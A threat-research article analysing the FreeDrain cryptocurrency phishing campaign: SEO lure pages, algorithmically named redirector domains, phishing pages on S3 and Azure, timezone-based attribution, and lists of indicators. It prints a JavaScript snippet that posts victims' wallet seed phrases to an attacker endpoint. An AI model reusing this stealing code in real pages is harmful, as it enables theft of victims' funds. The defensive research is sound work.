<p>Identifying FreeDrain lure pages at scale proved difficult due to extreme variation in phrasing, metadata, and platform-specific formatting. For example, we identified 46 unique renderings of the word &#8220;Trezor&#8221;, all visually similar, using tricks like added Unicode characters, zero-width spaces, and mixed script alphabets.</p>
<p><figure id="attachment_121023" aria-describedby="caption-attachment-121023" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_14.jpg" alt="Trezor variation heatmap by quantity" width="1999" height="1179" class="size-full wp-image-121023" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_14.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_14-300x177.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_14-1024x604.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_14-768x453.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_14-1536x906.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-121023" class="wp-caption-text">Trezor variation heatmap by quantity</figcaption></figure><br />
Demonstrating the variations in tooling use, we found that FreeDrain pages on github\.io were usually copies of the generated content from services like Mobrise Website Builder and Webflow.</p>
<p><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_20.jpg" alt="" width="1194" height="170" class="aligncenter size-full wp-image-121016" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_20.jpg 1194w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_20-300x43.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_20-1024x146.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_20-768x109.jpg 768w" sizes="auto, (max-width: 1194px) 100vw, 1194px" /><br />
<figure id="attachment_121017" aria-describedby="caption-attachment-121017" style="width: 1203px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_2.jpg" alt="Snippets of pages hosted on github\.io with content clearly generated using other tools, for example, “Mobrise Website Builder”" width="1203" height="169" class="size-full wp-image-121017" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_2.jpg 1203w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_2-300x42.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_2-1024x144.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_2-768x108.jpg 768w" sizes="auto, (max-width: 1203px) 100vw, 1203px" /><figcaption id="caption-attachment-121017" class="wp-caption-text">Snippets of pages hosted on github\.io with content clearly generated using other tools, for example, “Mobrise Website Builder”</figcaption></figure></p>
<p>A turning point in connecting these fragmented domains came from pivoting off the redirection infrastructure. While the lure content varied, the redirectors often remained consistent across pages and platforms.</p>
<figure id="attachment_121005" aria-describedby="caption-attachment-121005" style="width: 1240px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_8.jpg" alt="Validin result showing redirector abusing free services" width="1240" height="380" class="size-full wp-image-121005" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_8.jpg 1240w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_8-300x92.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_8-1024x314.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_8-768x235.jpg 768w" sizes="auto, (max-width: 1240px) 100vw, 1240px" /><figcaption id="caption-attachment-121005" class="wp-caption-text">Validin result showing redirector abusing free services</figcaption></figure>
<p>By tracing traffic from anchor links to known FreeDrain redirectors, we were able to map common ownership and activity across otherwise-unrelated services. This infrastructure-based pivot became essential for clustering and attribution, bridging gaps that the lure content itself couldn&#8217;t.</p>
<h2>Redirectors</h2>
<p>Pivoting on URLs from known and suspected FreeDrain lure pages that we were monitoring, we quickly noticed some noteworthy patterns in the FreeDrain redirection domains.</p>
<h3>Domain Characteristics</h3>
<p>Nearly all redirector domains shared several features:</p>
<ul>
<li aria-level="1">.com TLDs exclusively</li>
<li aria-level="1">Names that appeared algorithmically generated, likely via a Domain Generation Algorithm (DGA) or Markov chain model</li>
<li aria-level="1">English-adjacent structure, visually familiar but never forming real English words</li>
</ul>
<p>Examples include:</p>
<ul>
<li aria-level="1">antressmirestos[.]com</li>
<li aria-level="1">shotheatsgnovel[.]com</li>
<li aria-level="1">bildherrywation[.]com</li>
</ul>
<p>Each URL also included a GUID-like string in the path, which may have served as a session ID, traffic source identifier, or logic gate for redirection behavior. Examples:</p>
<ul>
<li aria-level="1">https://causesconighty[.]com/ce405b14-337a-43a5-9007-ed1aaf807998</li>
<li aria-level="1">https://causesconighty[.]com/d7c95729-6eed-452a-b246-865e0d97fc23</li>
<li aria-level="1">https://disantumcomptions[.]com/61e7fc9c-baef-43f0-82bf-a7f12a025586</li>
<li aria-level="1">https://disantumcomptions[.]com/6c31ec3b-0d4b-4bf4-a9f4-91453c4ef99e</li>
<li aria-level="1">https://distrypromited[.]com/d7c95729-6eed-452a-b246-865e0d97fc23</li>
<li aria-level="1">https://distrypromited[.]com/ff933705-9619-4292-9e22-02269acc197b</li>
<li aria-level="1">https://posectsinsive[.]com/9431711a-cf35-4ebd-b5db-eacba9ef7ee3</li>
<li aria-level="1">https://posectsinsive[.]com/994ffe2a-21fb-448a-b4e3-01b9483c5460</li>
</ul>
<p>(A complete list of FreeDrain-associated redirector domains is provided in the appendix.)</p>
<h3>Domain Registration and Infrastructure Clues</h3>
<p>All domains we identified were registered via Key-Systems GmbH, a registrar often used for bulk domain purchases and programmatic registration.</p>
<p>Initially, we suspected that these domains were all managed by the FreeDrain operators as well, but have since connected these domains to a much larger network of thousands domain names that are used to route traffic for many different purposes.</p>
<p>Looking at DNS history for some of the older redirectors on our list, we saw that they rotated IP addresses relatively infrequently, resolving to just a small number of IPs within a time window of weeks to months.</p>
<figure id="attachment_121018" aria-describedby="caption-attachment-121018" style="width: 1535px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_19.jpg" alt="DNS history for scientcontopped[.]com prior to expiration (2024)" width="1535" height="933" class="size-full wp-image-121018" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_19.jpg 1535w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_19-300x182.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_19-1024x622.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_19-768x467.jpg 768w" sizes="auto, (max-width: 1535px) 100vw, 1535px" /><figcaption id="caption-attachment-121018" class="wp-caption-text">DNS history for <em>scientcontopped[.]com</em> prior to expiration (2024)</figcaption></figure>
<p>The domain resolved to only a handful of IPs over its active life suggesting stable, centralized hosting infrastructure.</p>
<p>Pivoting on IP addresses shared by these older FreeDrain domains revealed that there are hundreds of other domain names that share nearly identical characteristics in terms of naming conventions, registration patterns, and hosting patterns. Yet, these other domains didn’t exhibit direct ties to FreeDrain behavior.</p>
<figure id="attachment_121021" aria-describedby="caption-attachment-121021" style="width: 1526px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_16.jpg" alt="Pivot from confirmed FreeDrain redirector (yellow asterisk) reveals broader domain ecosystem with matching infrastructure traits" width="1526" height="942" class="size-full wp-image-121021" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_16.jpg 1526w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_16-300x185.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_16-1024x632.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_16-768x474.jpg 768w" sizes="auto, (max-width: 1526px) 100vw, 1526px" /><figcaption id="caption-attachment-121021" class="wp-caption-text">Pivot from confirmed FreeDrain redirector (yellow asterisk) reveals broader domain ecosystem with matching infrastructure traits</figcaption></figure>
<p>This led us to two possibilities:</p>
<ol>
<li aria-level="1">The redirectors are part of a leased infrastructure-as-a-service model, used by FreeDrain and potentially many other threat actors</li>
<li aria-level="1">FreeDrain is a subdivision of a broader operation, with shared tooling and infrastructure but distinct campaigns</li>
</ol>
<p>At this stage, the full extent of this infrastructure and the relationships between campaigns remain an open research question. What is clear, however, is that FreeDrain does not operate in isolation, and the redirection layer may be a service used by multiple actors.</p>
<h2>Phishing Pages</h2>
<p>Across our monitoring, we observed dozens of variations in FreeDrain phishing pages but technically, they were all fairly simple and consistent in architecture.</p>
<p>These phishing pages were most often:</p>
<ul>
<li aria-level="1">Hosted on cloud infrastructure, primarily Amazon S3 and Azure Web Apps</li>
<li aria-level="1">Designed to mimic legitimate cryptocurrency wallet interfaces (Trezor, MetaMask, Ledger, etc.)</li>
<li aria-level="1">Implemented using HTML forms or AJAX POST requests to transmit stolen credentials to attacker-controlled endpoints</li>
</ul>
<figure id="attachment_121006" aria-describedby="caption-attachment-121006" style="width: 1594px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_7.jpg" alt="A typical FreeDrain phishing page served from an S3 bucket, delivering only static content" width="1594" height="915" class="size-full wp-image-121006" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_7.jpg 1594w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_7-300x172.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_7-1024x588.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_7-768x441.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_7-1536x882.jpg 1536w" sizes="auto, (max-width: 1594px) 100vw, 1594px" /><figcaption id="caption-attachment-121006" class="wp-caption-text">A typical FreeDrain phishing page served from an S3 bucket, delivering only static content</figcaption></figure>
<p>Some S3-hosted phishing sites sent harvested data to live backend services on Azure, as seen in multiple instances where form actions pointed to azurewebsites.net applications.</p>
<figure id="attachment_121020" aria-describedby="caption-attachment-121020" style="width: 860px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_17.jpg" alt="The form for an S3-hosted FreeDrain phishing page posts to “/send.php” running in Azure" width="860" height="240" class="size-full wp-image-121020" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_17.jpg 860w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_17-300x84.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_17-768x214.jpg 768w" sizes="auto, (max-width: 860px) 100vw, 860px" /><figcaption id="caption-attachment-121020" class="wp-caption-text">The form for an S3-hosted FreeDrain phishing page posts to <em>&#8220;/send.php&#8221;</em> running in Azure</figcaption></figure>
<h3>Human Operators Behind the Scenes</h3>
<p>While most pages used standard static phishing techniques, we occasionally encountered live chat widgets embedded in Azure-hosted phishing pages.</p>
<p>This chat feature had previously been documented in <a href="https://www.netskope.com/blog/attackers-continue-to-abuse-google-sites-and-microsoft-azure-to-host-cryptocurrency-phishing" target="_blank" rel="noopener noreferrer">a 2022 report by Netskope</a> (one of the few references we ever found to FreeDrain and the earliest reported). Our own interactions confirmed that humans, not bots, were responding to victim inquiries in real time, often providing reassurance or technical &#8220;help&#8221; to keep targets engaged.</p>
<figure id="attachment_121022" aria-describedby="caption-attachment-121022" style="width: 1505px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_15.jpg" alt="Live chat interaction on a phishing page hosted in Azure" width="1505" height="1134" class="size-full wp-image-121022" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_15.jpg 1505w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_15-300x226.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_15-1024x772.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_15-768x579.jpg 768w" sizes="auto, (max-width: 1505px) 100vw, 1505px" /><figcaption id="caption-attachment-121022" class="wp-caption-text">Live chat interaction on a phishing page hosted in Azure</figcaption></figure>
<h3>Clean, Unobfuscated Exfiltration Code</h3>
<p>In the malicious JavaScript that we observed that handled POST requests with stolen seed phrases, the code is well-formatted, commented, and does not appear to be obfuscated in any way. Full examples are provided in the appendix, but a snippet of the POST request is below (domain bolded and defanged):</p>
<pre>
const data = {};
inputs.forEach((input, index) => {
    data[`phrase${index}`] = input.value.trim();
});
data.subject = "Trezor connect2";
data.message = "Successfull fetch data";
$.ajax({
    type: "POST",
    url: "<b>https://rfhwuwixxi.execute-api.us-east-1.amazonaws[.]com/prod/eappmail</b>",
    dataType: "json",
    crossDomain: true,
    contentType: "application/json; charset=utf-8",
    data: JSON.stringify(data),
    success: function (result) {
        alert('Data submitted successfully1!');
        window.location.href = 'https://suite.trezor.io/web/';
        location.reload();
    },
    error: function (xhr, status, error) {
        window.location.href = 'https://suite.trezor.io/web/';
&nbsp;
&nbsp;
}
});
</pre>
<p>Despite its simplicity, the phishing backend was effective, disposable, and often difficult to trace—highlighting just how low the bar is for technical sophistication when paired with wide-scale reach and persistent lure infrastructure.</p>
<h2>Actor Analysis</h2>
<p>Attribution is inherently difficult when infrastructure is ephemeral and built on shared, free-tier services. Yet through a combination of repository metadata, behavioral signals, and timing artifacts, we were able to extract meaningful insights about FreeDrain&#8217;s operators, including likely location, working patterns, and their degree of operational coordination.</p>
<p>Our first major breakthrough came from GitHub Pages (<code>github.io</code>), which only allows hosting via a public repository that matches the account’s GitHub username (e.g., <code>username.github.io</code>). This constraint meant every active FreeDrain lure page hosted on GitHub had a publicly accessible repository behind it.</p>
<p>We cloned hundreds of these repositories and analyzed the commit metadata, including timestamps, usernames, email addresses, and whether commits were made via the CLI or web interface. Several clear patterns emerged:</p>
<ul>
<li aria-level="1">Email addresses were always unique, tied 1:1 with the GitHub account, and never reused.</li>
<li aria-level="1">All emails came from free providers like Gmail, Hotmail, Outlook, and ProtonMail.</li>
<li aria-level="1">While naming styles varied widely (capitalization, numbers, patterns), we found clusters of similarly structured addresses, suggesting manual creation by multiple individuals, possibly using shared templates or naming approach.</li>
</ul>
<figure id="attachment_121014" aria-describedby="caption-attachment-121014" style="width: 366px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_22.jpg" alt="Sample of email addresses found in FreeDrain-associated Github commit" width="366" height="632" class="size-full wp-image-121014" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_22.jpg 366w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_22-174x300.jpg 174w" sizes="auto, (max-width: 366px) 100vw, 366px" /><figcaption id="caption-attachment-121014" class="wp-caption-text">Sample of email addresses found in FreeDrain-associated Github commit</figcaption></figure>
<p>Importantly, GitHub commits preserve the local timezone of the user unless manually configured otherwise. In our dataset, over 99% of commits were timestamped in UTC+05:30 (Indian Standard Time), our first strong geographic indicator.</p>
<figure id="attachment_121008" aria-describedby="caption-attachment-121008" style="width: 886px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_5.jpg" alt="Over 99% of the commits analyzed were localized to UTC+05:30" width="886" height="511" class="size-full wp-image-121008" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_5.jpg 886w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_5-300x173.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_5-768x443.jpg 768w" sizes="auto, (max-width: 886px) 100vw, 886px" /><figcaption id="caption-attachment-121008" class="wp-caption-text">Over 99% of the commits analyzed were localized to UTC+05:30</figcaption></figure>
<p>We corroborated this signal using metadata from other FreeDrain free-infrastructure/services. Webflow, for instance, embeds a &#8220;last published&#8221; timestamp in the HTML source of hosted sites. When we aggregated timestamps across the many FreeDrain Webflow pages, a clear 9-to-5 weekday work pattern emerged, complete with a consistent midday break. This pattern aligns closely with a standard business schedule in the IST timezone.</p>
<figure id="attachment_121025" aria-describedby="caption-attachment-121025" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_12.jpg" alt="Aggregated Webflow publish times show an exceptionally clear weekday work pattern in UTC+05:30" width="1999" height="1180" class="size-full wp-image-121025" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_12.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_12-300x177.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_12-1024x604.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_12-768x453.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_12-1536x907.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-121025" class="wp-caption-text">Aggregated Webflow publish times show an exceptionally clear weekday work pattern in UTC+05:30</figcaption></figure>
<figure id="attachment_121013" aria-describedby="caption-attachment-121013" style="width: 1055px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_23.jpg" alt="Webflow embeds publish timestamps into the HTML source code of published websites" width="1055" height="598" class="size-full wp-image-121013" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_23.jpg 1055w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_23-300x170.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_23-1024x580.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_23-768x435.jpg 768w" sizes="auto, (max-width: 1055px) 100vw, 1055px" /><figcaption id="caption-attachment-121013" class="wp-caption-text">Webflow embeds publish timestamps into the HTML source code of published websites</figcaption></figure>
<p>Combining these and other signals across platforms, we assess with high confidence that FreeDrain is operated by individuals based in the IST timezone, likely in India, working standard weekday hours.</p>
<p>Additionally, timeline analysis shows that FreeDrain has been active since at least 2022, with a notable acceleration in mid-2024. As of this writing, the campaign remains active across several free hosting and publishing platforms.</p>
<figure id="attachment_121011" aria-describedby="caption-attachment-121011" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_25.jpg" alt="Confirmed “last published” times, by date" width="1999" height="1180" class="size-full wp-image-121011" srcset="https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_25.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_25-300x177.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_25-1024x604.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_25-768x453.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/05/FreeDrain_25-1536x907.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-121011" class="wp-caption-text">Confirmed “last published” times, by date</figcaption></figure>
<h2>Disruption Efforts and Opportunities</h2>
<p>The scale and diversity of services abused by FreeDrain made disruption an ongoing challenge. While the campaign leaned heavily on free-tier platforms, many of which allowed users to publish images, text, external links, and even custom JavaScript to subdomains under well-known parent domains, very few of these platforms offered streamlined abuse reporting workflows.</p>
<p>In most cases, there was no direct method to report malicious content from the content page itself, forcing us to manually investigate each platform’s policies, support forms, or contact channels. This adds unnecessary friction to the response process, especially when scaled across hundreds of active malicious pages.</p>
<p>Even more concerning, most of the publishing platforms lacked the detection capabilities to identify this type of coordinated abuse on their own. The indicators were there: repetitive naming patterns, clustered behavior, identical templates reused across subdomains, but limited proactive action was being taken.</p>
<p>This highlights a broader industry need:</p>
<ul>
<li>Free-tier content platforms should invest in basic abuse prevention tooling and more accessible reporting mechanisms.</li>
</ul>
<p>At minimum, this includes:</p>
<ul>
<li aria-level="1">Allowing abuse to be reported directly from published content pages</li>
<li aria-level="1">Monitoring for patterns of misuse (e.g., bulk account creation, similar domain structures, repeated hosting of external phishing kits)</li>
<li aria-level="1">Establishing direct communication lines with trusted threat intel analysts and threat researchers</li>
</ul>
<p>FreeDrain’s reliance on free-tier platforms is not unique, and without better safeguards, these services will continue to be weaponized at scale.</p>
<p>This isn’t just a security issue, it’s a business one. When threat actors abuse these platforms to host phishing pages, fake login portals, or crypto scams, they erode user trust in the entire platform domain. Over time, this leads to real financial consequences:</p>
<ul>
<li aria-level="1"><strong>Reputation damage:</strong> Reputable domain names like <code>webflow.io</code>, and <code>teachable.com</code> can quickly become flagged by corporate security tools, browser warning systems, and threat intelligence feeds. This reduces their utility for legitimate users and undermines the brand’s credibility.</li>
<li aria-level="1"><strong>Deliverability and discoverability</strong>: Once a platform’s domain is associated with widespread abuse, search engines, email providers, and social networks may down-rank or block links from that domain, hurting all users, including paying customers.</li>
<li aria-level="1"><strong>Customer churn and support burden</strong>: Abuse-driven issues often result in a higher volume of customer support tickets, complaints, and refunds, particularly when paying users find their content mistakenly flagged or blocked due to a shared domain reputation.</li>
<li aria-level="1"><strong>Increased infrastructure and fraud costs</strong>: Hosting abusive content, even at scale on free tiers, still consumes compute, storage, and bandwidth. Worse, it may attract waves of automated account signups and resource abuse that raise operational costs.</li>
</ul>
<p>Failing to detect and mitigate this kind of abuse isn’t just a user risk– it’s an unpaid tax on the business, dragging down growth and trust at every layer. Proactive abuse prevention and streamlined reporting are not just table stakes for security, they’re critical to long-term sustainability.</p>
<h2>References and Similarities to Other Campaigns</h2>
<p>Elements of the FreeDrain campaign were first publicly documented in <a href="https://www.netskope.com/blog/abusing-google-sites-and-microsoft-azure-for-crypto-phishing" target="_blank" rel="noopener noreferrer">August 2022 by Netskope</a>, with <a href="https://www.netskope.com/blog/attackers-continue-to-abuse-google-sites-and-microsoft-azure-to-host-cryptocurrency-phishing" target="_blank" rel="noopener noreferrer">a follow-up report</a> in September 2022. Netskope’s early findings captured the core tactics that continue today: leveraging SEO manipulation to drive traffic to lure pages, which then redirect to credential-harvesting phishing sites. Netskope also published another <a href="https://www.netskope.com/blog/attackers-target-crypto-wallets-using-codeless-webflow-phishing-pages" target="_blank" rel="noopener noreferrer">update in October 2024</a>, focusing on FreeDrain’s use of Webflow-hosted infrastructure, confirming the campaign’s continued evolution while retaining the same fundamental workflow.</p>
<p>FreeDrain’s abuse of legitimate free-tier platforms is part of a broader trend in phishing infrastructure, but it remains distinct from other well-known crypto phishing efforts. For example, the CryptoCore campaign, <a href="https://decoded.avast.io/martinchlumecky1/cryptocore-unmasking-the-sophisticated-cryptocurrency-scam-operations/" target="_blank" rel="noopener noreferrer">reported by Avast</a> in August 2024, similarly targets cryptocurrency users but relies heavily on YouTube content and impersonation videos to draw in victims, rather than search engine poisoning and static phishing sites.</p>
<p>In 2023, <a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/its-raining-phish-and-scams-how-cloudflare-pages-dev-and-workers-dev-domains-get-abused/" target="_blank" rel="noopener noreferrer">Trustwave reported</a> on the use of Cloudflare’s pages.dev and workers.dev services in phishing, showing how modern hosting platforms that offer free, customizable subdomains with minimal friction are being systematically exploited, mirroring FreeDrain’s approach.</p>
<p>Recent reporting has also shed light on the kinds of threat actors that may be behind campaigns like FreeDrain. Just this week, the U.S. Treasury<a href="https://home.treasury.gov/news/press-releases/sb0129" target="_blank" rel="noopener noreferrer"> sanctioned individuals linked to cyber scam operations in Southeast Asia</a>, specifically a militia group in Burma involved in online fraud networks. While distinct from FreeDrain, these operations share similar hallmarks: large-scale abuse of online infrastructure, technical capability, and a focus on financial theft, demonstrating the scale and organization such campaigns can operate under.</p>
<p>FreeDrain’s techniques have also been informally documented by affected users. In particular, Trezor hardware wallet customers have reported fraudulent websites mimicking the Trezor ecosystem, some of which were part of FreeDrain’s infrastructure:</p>
<ul>
<li aria-level="1"><a href="https://forum.trezor.io/t/reporting-scam-site/20284" target="_blank" rel="noopener noreferrer">Forum report: Reporting scam site</a></li>
<li aria-level="1"><a href="https://forum.trezor.io/t/fake-trezor-websites/173/5" target="_blank" rel="noopener noreferrer">Forum discussion: Fake Trezor websites</a></li>
</ul>
<h2>Conclusion</h2>
<p>The FreeDrain network represents a modern blueprint for scalable phishing operations, one that thrives on free-tier platforms, evades traditional abuse detection methods, and adapts rapidly to infrastructure takedowns. By abusing dozens of legitimate services to host content, distribute lure pages, and route victims, FreeDrain has built a resilient ecosystem that’s difficult to disrupt and easy to rebuild.</p>
<p>Through detailed infrastructure analysis, repository metadata mining, and cross-platform behavioral correlations, we uncovered rare insights into the actors behind the campaign, including strong indicators that the operation is manually run by a group based in the UTC+05:30 timezone, working standard business hours. Despite this visibility, systemic weaknesses in reporting mechanisms and abuse detection have allowed FreeDrain to persist and even accelerate in 2024.</p>
<p>This is not just a FreeDrain problem. The broader ecosystem of free publishing platforms is being exploited in ways that disproportionately benefit financially motivated threat actors. Without stronger default safeguards, identity verification, or abuse response infrastructure, these services will continue to be abused, undermining user trust and inflicting real-world financial harm.</p>
<p>By exposing the scale and structure of the FreeDrain network, we hope this research will enable better platform-level defenses, more informed user education, and collaboration across the security community to limit the reach and longevity of operations like this.</p>
<h2>Indicators of Compromise and Relations</h2>
<p><a href="https://github.com/Validin/indicators/tree/master/FreeDrain" target="_blank" rel="noopener noreferrer">Full List of IOCs can be downloaded here</a>.</p>
<h3>FreeDrain Lure Pages</h3>
<p>Download Full List for over 40,000 URLs<br />
Sample:</p>
<p>https://metamaskchromextan.gitbook\.io/us<br />
https://suprt-ios-trzorhard.gitbook\.io/en-us<br />
https://bridge-tziuur.gitbook\.io/en-us<br />
https://auth-ledger-com-cdn.webflow\.io/<br />
https://start&#8212;leddger-cdn-auth.webflow\.io/<br />
https://help&#8211;ledgre-auth-us.webflow\.io/<br />
https://home-trezsor-start.gitbook\.io/en-us<br />
https://wlt-phantom-wlt.webflow\.io/<br />
https://bridge-cen-trezseer.gitbook\.io/en-us<br />
https://ledgerauth-wellat.webflow\.io/<br />
https://ledgerivwaselet-us.webflow\.io/<br />
https://extentrust.gitbook\.io/en-us<br />
https://truststextion.gitbook\.io/us<br />
https://apps-support&#8212;mettmask.gitbook\.io/us<br />
https://cobo-wallet-digital-cdm.webflow\.io/<br />
https://extension&#8211;metaamsk-info.gitbook\.io/us<br />
https://bridge-docs&#8211;trzc.gitbook\.io/en-us<br />
https://suite-trezoreio.gitbook\.io/us<br />
https://auth&#8211;io-coinbausehelp.gitbook\.io/us<br />
https://help-blockf-cdnn.teachable\.com/p/home</p>
<h3>FreeDrain Redirect Domains</h3>
<p>These are the redirector domains we directly observed leveraged by FreeDrain going back 3+ years.</p>
<p>affanytougees[.]com<br />
ameddingpersusan[.]com<br />
anicnicpriesert[.]com<br />
antressmirestos[.]com<br />
aparingupgger[.]com<br />
bildherrywation[.]com<br />
boutiondistan[.]com<br />
brasencewompture[.]com<br />
carefersoldidense[.]com<br />
causesconighty[.]com<br />
charweredrepicks[.]com<br />
chazineconally[.]com<br />
chierstimines[.]com<br />
chopedansive[.]com<br />
claredcarcing[.]com<br />
coadormertranegal[.]com<br />
coateethappallel[.]com<br />
comaincology[.]com<br />
coneryconstiny[.]com<br />
conkeyprowse[.]com<br />
coutioncargin[.]com<br />
coveryinting[.]com<br />
crefoxappecture[.]com<br />
curphytompared[.]com<br />
darylapsebaryanmar[.]com<br />
deconsorconsuperb[.]com<br />
disantumcomptions[.]com<br />
distrypromited[.]com<br />
escentdeveriber[.]com<br />
fladestateins[.]com<br />
flesterwisors[.]com<br />
forrofilecabelle[.]com<br />
gaiterimturches[.]com<br />
goestodos[.]com<br />
grawableaugespare[.]com<br />
gresesticparray[.]com<br />
guardawalle[.]com<br />
hunnerdimental[.]com<br />
issetheserepson[.]com<br />
lamothyadjuncan[.]com<br />
leatlyinsioning[.]com<br />
leavesnottered[.]com<br />
listationsomminder[.]com<br />
litnentschelds[.]com<br />
minarymacrefeat[.]com<br />
mingaryshestence[.]com<br />
nashiclehunded[.]com<br />
obiansvieller[.]com<br />
paticableharent[.]com<br />
penlabuseoribute[.]com<br />
peridneyperadebut[.]com<br />
pladamousaribached[.]com<br />
posectsinsive[.]com<br />
pringingsernel[.]com<br />
saverateaubtle[.]com<br />
scientcontopped[.]com<br />
screnceagrity[.]com<br />
searranksdeveal[.]com<br />
shotheatsgnovel[.]com<br />
sonyonsa[.]com<br />
stalitynotinium[.]com<br />
storsianpreemed[.]com<br />
swissborglogi[.]xyz<br />
teleedlescestable[.]com<br />
tirzrstartio[.]com<br />
topsorthynaveneur[.]com<br />
tralizetrulines[.]com<br />
trighlandcomping[.]com<br />
versaryconnedges[.]com<br />
walitykildsence[.]com<br />
wintrolancing[.]com</p>
<h3>Phishing URLs</h3>
<p>https://atomicwallet.azurewebsites[.]net/<br />
https://bietbutylogn.azurewebsites[.]net/<br />
https://biokefeiwltliv29gleed.azurewebsites[.]net/<br />
https://bitgetwalt.azurewebsites[.]net/<br />
https://bleuckfie-coins.azurewebsites[.]net/<br />
https://bleuckkfiecoins.azurewebsites[.]net/<br />
https://bleuickkfiescoins.azurewebsites[.]net/<br />
https://blocckfi-api.azurewebsites[.]net/<br />
https://blocikifi.azurewebsites[.]net/<br />
